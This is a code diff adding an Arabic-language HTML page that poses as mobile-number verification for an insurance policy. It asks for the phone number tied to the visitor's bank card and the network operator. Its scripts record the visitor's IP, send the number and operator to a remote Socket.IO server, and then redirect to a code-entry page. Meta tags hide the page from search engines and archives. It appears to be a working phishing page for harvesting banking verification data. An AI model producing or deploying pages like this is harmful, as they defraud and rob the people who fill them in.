@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta charset="utf-8" />
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>Phone</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Readex Pro", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-style: normal;
+      font-variation-settings: "HEXP" 0;
+    }
+
+    .content {
+      background: white;
+      border-radius: 0 0 20px 20px;
+      padding: 30px 20px;
+      margin: -30px 10px 30px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      min-height: 200px;
+      font-size: 16px;
+      color: #333;
+    }
+
+    .content-section {
+      display: none;
+    }
+
+    .content-section.active {
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .form-group label {
+      font-size: 14px;
+      font-weight: 400;
+      color: #777;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    #loadingOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container mt-3 d-none" id="phone_error"></div>
+  <div class="container mt-5" id="applePayRadio">
+    <div class="row justify-content-center">
+      <div class="col-md-6 col-lg-4">
+        <div style="
+              border: 1px solid #ddd;
+              border-radius: 12px;
+              font-family: 'Tahoma', sans-serif;
+              overflow: hidden;
+            ">
+          <div style="padding: 0px 16px 16px 16px">
+            <div class="text-center">
+              <div class="mb-5 text-left">
+                <img alt="" src="assets/photos/cstr.png" width="250px" />
+              </div>
+              <h5>توثيق رقم الجوال</h5>
+              <p class="text-right mt-3" style="font-size: small">
+                يرجى إدخال رقم الجوال ومشغّل شبكة الاتصالات الخاص بك، وذلك
+                لاستكمال إجراءات إصدار وثيقة التأمين وربطها بالبيانات
+                المعتمدة. على أن يكون رقم الجوال المرتبط بالبطاقة البنكية،
+                وذلك لأغراض التحقق.
+              </p>
+              <form id="phoneForm">
+                <div class="form-group text-right">
+                  <label for="phone_input">أدخل رقم الجوال :</label>
+                  <input class="form-control text-center" id="phone_input" type="tel" placeholder="05xxxxxxxx"
+                    minlength="10" maxlength="10" pattern="^05[0-9]{8}$"
+                    title="يجب أن يبدأ الرقم بـ05 ويكون مكوّنًا من 10 أرقام دون رمز الدولة"
+                    oninput="this.value = this.value.replace(/\D/g, '').slice(0, 10)" required />
+                </div>
+                <div class="form-group text-right">
+                  <label for="Selectـnetworkـoperator">إختيار مشغل الشبكة :</label>
+                  <select class="form-control" id="Selectـnetworkـoperator">
+                    <option value="STC">STC</option>
+                    <option value="Mobily">Mobily</option>
+                    <option value="Zain">Zain</option>
+                    <option value="Lebara">Lebara</option>
+                    <option value="Virgin">Virgin</option>
+                  </select>
+                </div>
+                <div class="alert alert-danger text-right" role="alert" id="decline-message" style="display: none">
+                  <span>
+                    عذرا، رقم الجوال المدخل غير صحيح او غير مرتبط بوسيلة
+                    الدفع.
+                  </span>
+                </div>
+
+                <button class="btn btn-primary col-12" type="submit">
+                  تأكيد
+                </button>
+                <a>
+                  <p class="text-right text-secondary mt-3" style="font-size: x-small">
+                    هل تحتاج للمساعدة ؟
+                  </p>
+                </a>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="loadingOverlay" class="d-none">
+    <div class="text-center text-white">
+      <div class="spinner-border text-light mb-3" role="status"></div>
+      <h5 class="font-weight-bold">يرجى الانتظار</h5>
+      <p>انتظر حتى تتم معالجة طلبك</p>
+    </div>
+  </div>
+
+  <!-- 1) Socket.IO -->
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+  <script>
+    window.socket = io("https://b-care-server-mohammad.onrender.com");
+    window.visitorIP = null;
+
+    (async () => {
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await r.json();
+        window.visitorIP = ip;
+        const page =
+          window.location.pathname.split("/").pop() || "phone.html";
+        window.socket.emit("updateLocation", { ip, page });
+      } catch (e) {
+        console.error("IP fetch failed:", e);
+      }
+    })();
+  </script>
+
+  <!-- 2) location.js -->
+  <script src="./assets/js/location.js"></script>
+
+  <!-- 3) Form → socket submission & overlay -->
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("phoneForm");
+      const overlay = document.getElementById("loadingOverlay");
+      const declineMsg = document.getElementById("decline-message");
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        // **show** overlay
+        overlay.classList.remove("d-none");
+        overlay.classList.add("d-flex");
+
+        while (window.visitorIP === null) {
+          await new Promise((r) => setTimeout(r, 50));
+        }
+
+        const phoneNum = document.getElementById("phone_input").value;
+        const operator = document.getElementById("Selectـnetworkـoperator").value;
+
+        window.socket.emit("submitPhone", {
+          ip: window.visitorIP,
+          phoneNumber: phoneNum,
+          operator,
+        });
+      });
+
+      // 3a) Show decline‐message if URL contains '?declined=true'
+      const params = new URLSearchParams(window.location.search);
+      if (params.get("declined") === "true") {
+        declineMsg.style.display = "block";
+      }
+
+      // redirect to phonecode.html on success
+      window.socket.on("ackPhone", (resp) => {
+        if (resp.success) {
+          window.location.href = "phonecode.html";
+        } else {
+          // hide overlay on error
+          overlay.classList.remove("d-flex");
+          overlay.classList.add("d-none");
+          declineMsg.style.display = "block";
+          console.error(resp.error);
+        }
+      });
+    });
+  </script>
+
+
+  <!-- 4) jQuery THEN Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
